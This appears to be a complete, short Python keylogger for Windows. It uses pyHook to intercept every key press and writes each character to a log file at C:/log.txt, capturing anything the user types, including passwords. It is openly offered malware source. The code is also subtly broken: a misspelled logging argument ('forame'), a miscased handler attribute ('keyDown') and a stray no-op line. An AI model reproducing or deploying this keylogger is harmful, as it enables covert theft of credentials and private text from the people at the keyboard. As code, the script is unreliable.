import pyHook,pythoncom,sys,logging

file_log = 'C:/log.txt'

def onkeyboard(event):
	logging.basicConfig(filename=file_log,level=logging.DEBUG,forame='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

hooks_manger = pyHook.HookManager()
hooks_manger.keyDown = onkeyboard
hooks_manger.HookKeyboard()
pythoncom.PumpMessages()